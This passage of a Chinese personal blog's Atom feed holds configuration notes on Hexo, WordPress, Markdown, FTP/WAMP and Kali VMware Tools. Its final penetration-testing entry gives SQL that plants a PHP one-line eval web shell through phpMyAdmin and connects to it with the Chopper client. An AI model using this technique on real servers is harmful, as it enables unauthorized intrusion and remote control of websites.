        &lt;p&gt;&amp;emsp;我又回来了！&lt;br&gt;&lt;br&gt;&amp;emsp;生活逐渐走上正轨，做了一些计划，把文档也重新写起来了，这几天折腾了下把博客也开起来（反正买了三年的域名）。&lt;/p&gt;

      
    
    </summary>
    
      <category term="随笔" scheme="https://asanzjx.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="blog" scheme="https://asanzjx.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>在Github上搭建个人博客</title>
    <link href="https://asanzjx.github.io/2016/05/29/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://asanzjx.github.io/2016/05/29/在Github上搭建个人博客/</id>
    <published>2016-05-28T16:00:00.000Z</published>
    <updated>2016-08-18T06:02:05.224Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="摘要">摘要</span></h1><p>本文档记录在Github上搭建个人博客的学习笔记，涉及git,github,Hexo的内容。</p><h2><span id="updaterecordes">Updaterecordes</span></h2><ul><li><p>2016-08-17\<br>添加“其他页面配置”；“图片显示资源引用问题”；”写文章“；”代码高亮“</p></li><li><p>2016-08-18\<br>添加“本地测试”；“评论”</p></li></ul><h1><span id="hexo笔记">Hexo笔记</span></h1><p>Hexo官方文档：<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="external">https://hexo.io/zh-cn/docs/</a>。</p><h2><span id="简介">简介</span></h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用<br>Markdown来解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h2><span id="安装">安装</span></h2><p>安装前请确认电脑中已经安装<a href="https://nodejs.org/en/" target="_blank" rel="external">Node.js</a>和<a href="https://git-scm.com/" target="_blank" rel="external">Git</a>(本文安装<a href="https://desktop.github.com/" target="_blank" rel="external">Github</a>)并配置好环境变量。</p><pre><code>npm install -g hexo-cli</code></pre><h2><span id="安装插件">安装插件</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-index --save</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line">npm install hexo-generator-category --save</span><br><span class="line">npm install hexo-generator-tag --save</span><br><span class="line">npm install hexo-server --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-deployer-heroku --save</span><br><span class="line">npm install hexo-deployer-rsync --save</span><br><span class="line">npm install hexo-deployer-openshift --save</span><br><span class="line">npm install hexo-renderer-marked@0.2 --save</span><br><span class="line">npm install hexo-renderer-stylus@0.2 --save</span><br><span class="line">npm install hexo-generator-feed@1 --save</span><br><span class="line">npm install hexo-generator-sitemap@1 --save</span><br><span class="line">npm install hexo-generator-cname --save</span><br></pre></td></tr></table></figure><p>如果我们直接创建一个新文件CNAME，填好域名。但会发现在下一次部署后这个文件就消失了。不用惊讶，因为hexo并不会自动生成CNAME文件，所以在部署时被覆盖删除了。这个插件自动在public里生成一个CNAME文件，把你的域名加进去再部署一下,</p><h2><span id="常用操作">常用操作</span></h2><h3><span id="写文章">写文章</span></h3><p><a href="https://hexo.io/zh-cn/docs/writing.html" target="_blank" rel="external">https://hexo.io/zh-cn/docs/writing.html</a>\<br>当然也可以直接在source目录下新建一个.md文件</p><pre><code>hexo new [layout] &lt;title&gt;# orhexo n &lt;title&gt;#`将草稿转为post`hexo publish [layout] &lt;title&gt;#Scaffold`（模板）`hexo new photo &quot;My Gallery&quot;</code></pre><p>Hexo 会尝试在 scaffolds 文件夹中寻找 photo.md，并根据其内容建立文章。</p><h4><span id="layout">Layout</span></h4><p>默认为post。Hexo<br>有三种默认布局：post（存储在source/_posts下）、page（存储在source下）<br>和 draft（草稿，存储在source/_drafts）.</p><h3><span id="生成文件及部署">生成文件及部署</span></h3><pre><code>hexo generate# orhexo ghexo generate --watch# orhexo g -w</code></pre><p>Hexo 能够监视文件变动并立即重新生成静态文件，在生成时会比对文件的 SHA1<br>checksum，只有变动的文件才会写入。</p><p>执行下列的其中一个命令，让 Hexo<br>在生成完毕后自动部署网站，这些命令的作用是相同的。</p><pre><code>hexo generate --deplyhexo deploy --generatehexo d -ghexo g -d</code></pre><h3><span id="本地测试">本地测试</span></h3><p>默认地址：127.0.0.1:4000</p><pre><code>hexo server# orhexo shexo s -p PORT# `自定义IP`hexo server -i 192.168.1.1# `静态模式`hexo server -s</code></pre><p>在静态模式下，服务器只处理 public<br>文件夹内的文件，而不会处理文件变动，在执行时，您应该先自行执行 hexo<br>generate。</p><h2><span id="主题相关">主题相关</span></h2><p>这里使用NexT主题。<a href="http://theme-next.iissnan.com/" target="_blank" rel="external">http://theme-next.iissnan.com/</a></p><h3><span id="代码高亮">代码高亮</span></h3><p>NexT 使用 Tomorrow Theme 作为代码高亮，共有5款主题供你选择。<br>默认使用的是白色的 normal。</p><figure class="highlight plain"><figcaption><span>language="bash"&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlit_theme:  night</span><br></pre></td></tr></table></figure><h2><span id="个性化配置">个性化配置</span></h2><p>在 Hexo 中有两份主要的配置文件，其名称都是 _config.yml。<br>其中，一份位于站点根目录下，主要包含 Hexo<br>站点本身的配置；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项。配置文件使用的是Yml语言。</p><h3><span id="图片显示及资源引用问题">图片显示及资源引用问题</span></h3><h4><span id="problem">Problem：</span></h4><p>主页无法显示图片，文章具体页面可以显示</p><h4><span id="try">Try：</span></h4><p>修改站点配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure><p>#开启文章资源文件夹，为每篇文章创建一个目录。这个目录包含所有的资源，这样可以通过相对路径引用。</p><h3><span id="hexo生成文章目录">Hexo生成文章目录</span></h3><p>hexo-toc插件，此插件可以生成文章目录。</p><pre><code>npm install hexo-toc --save</code></pre><p>在站点配置文件（_config.yml）中配置如下</p><pre><code>#toc configurationtoc:   maxDepth: 3 #`最多可生成三级目录`</code></pre><p>重新生成即可。</p><h3><span id="其他页面生成">其他页面生成</span></h3><p>这里以分类页面为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories #`新建一个页面`</span><br><span class="line"></span><br><span class="line">type: &quot;categories&quot;</span><br></pre></td></tr></table></figure><p>编辑刚新建的页面，将页面的类型设置为 categories<br>，主题将自动为这个页面显示所有分类。</p><h3><span id="评论系统">评论系统</span></h3><p>这里采用DISQUS：<a href="https://disqus.com/" target="_blank" rel="external">https://disqus.com/</a>。</p><p>具体步骤：</p><ol><li><p>首先在官网上注册一个号</p></li><li><p>依据步骤填写shortname等信息，\<br>在Choose your platform 页面，这里依据实际情况选择Universal Code</p></li><li><p>复制第一个代码块中的代码，然后打开<br>comment.ejs，删除所有代码并粘贴刚才复制的代码，保存即可。</p></li><li><p>在站点配置文件添加“disqus_shortname: YourShortName”</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;span id=&quot;摘要&quot;&gt;摘要&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;本文档记录在Github上搭建个人博客的学习笔记，涉及git,github,Hexo的内容。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;updaterecordes&quot;&gt;Updaterecordes&lt;/span&gt;&lt;/h
      
    
    </summary>
    
      <category term="配置相关" scheme="https://asanzjx.github.io/categories/%E9%85%8D%E7%BD%AE%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="配置" scheme="https://asanzjx.github.io/tags/%E9%85%8D%E7%BD%AE/"/>
    
      <category term="Hexo" scheme="https://asanzjx.github.io/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>wordpress 更改固定链接出现404解决方案</title>
    <link href="https://asanzjx.github.io/2016/03/01/2016-03-01-wordpress%20%E6%9B%B4%E6%94%B9%E5%9B%BA%E5%AE%9A%E9%93%BE%E6%8E%A5%E5%87%BA%E7%8E%B0404%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://asanzjx.github.io/2016/03/01/2016-03-01-wordpress 更改固定链接出现404解决方案/</id>
    <published>2016-03-01T08:14:46.000Z</published>
    <updated>2016-08-18T06:45:30.906Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="背景">背景</span></h3><blockquote><p>在wordpres后台设置中修改固定链接，发现打开具体文章出现404页面。</p></blockquote><h3><span id="解决方案">解决方案</span></h3><blockquote><p>修改httpd.conf文件，把#LoadModule rewrite_module modules/mod_rewrite.so 改为 LoadModule rewrite_module modules/mod_rewrite.so，即去掉注释。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;背景&quot;&gt;背景&lt;/span&gt;&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;在wordpres后台设置中修改固定链接，发现打开具体文章出现404页面。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;&lt;span id=&quot;解决方案&quot;&gt;解决方案&lt;/span&gt;&lt;/h3&gt;
      
    
    </summary>
    
      <category term="配置相关" scheme="https://asanzjx.github.io/categories/%E9%85%8D%E7%BD%AE%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="wordpress" scheme="https://asanzjx.github.io/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>Markdwown 常用语法</title>
    <link href="https://asanzjx.github.io/2016/03/01/2016-03-01-Markdwown%20%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/"/>
    <id>https://asanzjx.github.io/2016/03/01/2016-03-01-Markdwown 常用语法/</id>
    <published>2016-03-01T08:09:56.000Z</published>
    <updated>2016-08-18T06:46:04.735Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="导言">导言</span></h1><h2><span id="updaterecords">UpdateRecords</span></h2><ul><li>2016-08-18\ Optimize</li></ul><p>本文使用MarkdownPad 2（可在<a href="http://markdownpad.com/" target="_blank" rel="external">官网</a>上下载） 编写。</p><p><strong>注意：win10下载安装后可能会出现无法预览的问题，下载安装<a href="http://markdownpad.com/download/awesomium_v1.6.6_sdk_win.exe" target="_blank" rel="external">awesomiumv1.6.6sdk_win</a>，这是一个 HTML UI ENGINE。</strong></p><h2><span id="常用语法">常用语法</span></h2><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#  一级标题</span></span><br><span class="line"></span><br><span class="line"><span class="section">##  二级标题</span></span><br><span class="line"></span><br><span class="line"><span class="section">##  三级标题</span></span><br><span class="line"></span><br><span class="line">---  分隔符</span><br><span class="line"></span><br><span class="line">–  无序列表</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.  </span>有序列表</span><br><span class="line"></span><br><span class="line">[<span class="string">文本</span>](<span class="link">链接</span>)  超链接</span><br><span class="line"></span><br><span class="line"><span class="quote">&gt;  引用</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**粗体**</span>  粗体</span><br><span class="line"></span><br><span class="line"><span class="emphasis">*斜体*</span>  斜体</span><br><span class="line"></span><br><span class="line">![<span class="string">图片名</span>](<span class="link">链接</span>)  插入图片</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;span id=&quot;导言&quot;&gt;导言&lt;/span&gt;&lt;/h1&gt;&lt;h2&gt;&lt;span id=&quot;updaterecords&quot;&gt;UpdateRecords&lt;/span&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2016-08-18\ Optimize&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本文使用Markdo
      
    
    </summary>
    
      <category term="ToolView" scheme="https://asanzjx.github.io/categories/ToolView/"/>
    
    
      <category term="Markdown" scheme="https://asanzjx.github.io/tags/Markdown/"/>
    
  </entry>
  
  <entry>
    <title>winserver2003 配置FTP，wampserver环境，wordpress等问题</title>
    <link href="https://asanzjx.github.io/2016/02/04/2016-02-04-winserver2003%20%E9%85%8D%E7%BD%AEFTP%EF%BC%8Cwampserver%E7%8E%AF%E5%A2%83%EF%BC%8Cwordpress%E7%AD%89%E9%97%AE%E9%A2%98/"/>
    <id>https://asanzjx.github.io/2016/02/04/2016-02-04-winserver2003 配置FTP，wampserver环境，wordpress等问题/</id>
    <published>2016-02-04T12:56:52.000Z</published>
    <updated>2016-08-18T06:45:00.684Z</updated>
    
    <content type="html"><![CDATA[<p>在winserver 2003下配置FTP（用IIS6.0搭建），提示“打开FTP服务器上的文件夹时发生错误,请检查是否有权限访问”，这里提供几个解决方案：</p><ul><li><p>检查文件的访问权限，是否给了FTP用户权限访问</p></li><li><p>关闭ie增强安全配置</p></li><li><p>在配置时选择“不启用用户隔离模式”</p></li><li><p>关闭“使用被动FTP（为防火墙和DSL调制解调器兼容性）”（在Internet 选项-&gt;高级-&gt;浏览）</p></li><li><p>干完这些，重启服务，不行的话，直接重启服务器！！！</p></li></ul><p>由于是winserver2003环境，安装wampserver 2.5 32位提示httpd.exe不是有效的win32应用程序，下载安装2.4及其以下的版本安装即可。</p><p>wordpress在下载更新的时候，提示”下载失败。: 没有可以完成请求的HTTP传输器。”，直接修改php配置文件，php.ini，找到;extension=php_curl.dll，去掉注释即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在winserver 2003下配置FTP（用IIS6.0搭建），提示“打开FTP服务器上的文件夹时发生错误,请检查是否有权限访问”，这里提供几个解决方案：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;检查文件的访问权限，是否给了FTP用户权限访问&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;关
      
    
    </summary>
    
      <category term="配置相关" scheme="https://asanzjx.github.io/categories/%E9%85%8D%E7%BD%AE%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="Windows server 2003" scheme="https://asanzjx.github.io/tags/Windows-server-2003/"/>
    
      <category term="FTP" scheme="https://asanzjx.github.io/tags/FTP/"/>
    
      <category term="wamperserver" scheme="https://asanzjx.github.io/tags/wamperserver/"/>
    
      <category term="wordpress" scheme="https://asanzjx.github.io/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>kali 安装VMwareToos</title>
    <link href="https://asanzjx.github.io/2015/09/03/2015-09-03-kali%20%E5%AE%89%E8%A3%85VMwareToos/"/>
    <id>https://asanzjx.github.io/2015/09/03/2015-09-03-kali 安装VMwareToos/</id>
    <published>2015-09-03T05:22:49.000Z</published>
    <updated>2016-08-18T07:19:00.990Z</updated>
    
    <content type="html"><![CDATA[<p><strong>打开虚拟机VMware—-&gt;install vmware tools</strong><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /media/cdrom0/</span><br><span class="line"></span><br><span class="line">cp VMwareTools*.tar.gz /root/</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/</span><br><span class="line"></span><br><span class="line">tar -zxvf VMwareTools*.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> vmware-toos-distrib</span><br><span class="line"></span><br><span class="line">./vmware-install.pl</span><br></pre></td></tr></table></figure></p><p><strong>接下来根据提示操作。有的地方需要选择no</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;打开虚拟机VMware—-&amp;gt;install vmware tools&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;li
      
    
    </summary>
    
      <category term="配置相关" scheme="https://asanzjx.github.io/categories/%E9%85%8D%E7%BD%AE%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="kali" scheme="https://asanzjx.github.io/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin获得shell--初试一句话木马，chopper</title>
    <link href="https://asanzjx.github.io/2015/08/01/2015-08-01-phpmyadmin%E8%8E%B7%E5%BE%97shell--%E5%88%9D%E8%AF%95%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%8Cchopper/"/>
    <id>https://asanzjx.github.io/2015/08/01/2015-08-01-phpmyadmin获得shell--初试一句话木马，chopper/</id>
    <published>2015-08-01T07:17:49.000Z</published>
    <updated>2016-08-18T07:17:44.514Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="进入到phpmyadmin后台本例中以bak配置文件泄露为例">进入到phpmyadmin后台（本例中以bak配置文件泄露为例）</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  create table foo(`cmd` text not <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">  insert into `foo`(`cmd`) values (<span class="string">"&lt;?php @eval($_POST['foo']);?&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  select `cmd`  from `foo` into outfile <span class="string">"./foo.php"</span></span><br></pre></td></tr></table></figure><p>(最好能找到网站路径的的路径，这样写的话在\wamp\bin\mysql\mysql5.6.17\data目录下会生成一个foo.php文件);</p><p>执行完命令后，可以测试是否成功，浏览器直接打开/foo.php，如果出现空白就可以。</p><h3><span id="接下来用chopper">接下来用chopper</span></h3><p>地址为网站foo.php地址，密码为$_POST[]内的内容，配置（可填可不填，如果要管理数据库的话要填），接下来是脚本类型，编码。</p><p>这样就基本可以获得网站的shell，看shell的权限，有的权限很大，有的权限紧紧限于网站根目录的管理。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;进入到phpmyadmin后台本例中以bak配置文件泄露为例&quot;&gt;进入到phpmyadmin后台（本例中以bak配置文件泄露为例）&lt;/span&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class
      
    
    </summary>
    
      <category term="PT" scheme="https://asanzjx.github.io/categories/PT/"/>
    
    
      <category term="PT" scheme="https://asanzjx.github.io/tags/PT/"/>
    
      <category term="一句话木马" scheme="https://asanzjx.github.io/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    
      <category term="chopper" scheme="https://asanzjx.github.io/tags/chopper/"/>
    
  </entry>
  
</feed>
